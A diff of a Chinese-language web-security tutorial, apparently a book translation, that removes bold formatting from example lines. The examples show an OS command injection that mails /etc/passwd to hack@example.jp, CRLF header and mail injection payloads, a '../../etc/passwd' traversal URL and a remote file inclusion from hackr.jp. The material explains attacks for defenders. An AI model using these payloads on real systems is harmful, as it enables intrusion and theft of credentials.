@@ -148,7 +148,7 @@ OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作
 
 程序接收该值，构成以下的命令组合。 
 
-> | /usr/sbin/sendmail **; cat /etc/passwd** | **mail hack@example.jp** 
+> | /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
 
 攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。 
 
@@ -162,9 +162,9 @@ OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作
 
 如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。 
 
-> Location: http://www.example.com/a.cgi?q=**12345**
+> Location: http://www.example.com/a.cgi?q=12345
 >
-> Set-Cookie: UID=**12345**
+> Set-Cookie: UID=12345
 >
 > ＊12345就是插入值
 
@@ -175,7 +175,7 @@ OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作
 
 攻击者以下面的内容替代之前的类别 ID 后发送请求。 
 
-> 101**%0D%0ASet-Cookie:+SID=123456789**
+> 101%0D%0ASet-Cookie:+SID=123456789
 
 其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。发送该请求之后，假设结果返回以下响应。
 
@@ -205,13 +205,13 @@ OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作
 
 攻击者将以下数据作为邮件地址发起请求。 
 
-> bob@hackr.jp**%0D%0ABcc: user@example.com** 
+> bob@hackr.jp%0D%0ABcc: user@example.com
 
 %0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 Bcc 邮件地址的追加发送，而这原本是无法指定的。 
 
 另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本内容并发送。 
 
-> bob@hackr.jp**%0D%0A%0D%0A**Test Message 
+> bob@hackr.jp%0D%0A%0D%0ATest Message 
 
 再以相同的方法，就有可能改写 To 和 Subject 等任意邮件首部，或向文本添加附件等动作。 
 
@@ -223,11 +223,11 @@ OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作
 
 以下查询字段，指定某个文件名。然后从 /www/log/ 文件目录下读取这个指定的文件。 
 
-> http://example.com/read.php?log=**0401.log** 
+> http://example.com/read.php?log=0401.log
 
 攻击者设置如下查询字段后发出请求。 
 
-> http://example.com/read.php?log=**../../etc/passwd** 
+> http://example.com/read.php?log=../../etc/passwd
 
 查询字段为了读取攻击者盯上的 /etc/passwd 文件，会从 /www/log/ 目录开始定位相对路径。如果这份 read.php 脚本接受 对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。 
 
@@ -241,7 +241,7 @@ http://example.com/foo.php 的源代码（部分摘录）
 
 攻击者指定如同下面形式的 URL发出请求。 
 
-> http://example.com/foo.php?mod=**http://hackr.jp/cmd.php&cmd=ls** 
+> http://example.com/foo.php?mod=http://hackr.jp/cmd.php&cmd=ls
 
 攻击者已事先在外部服务器上准备了以下这段脚本。 
 
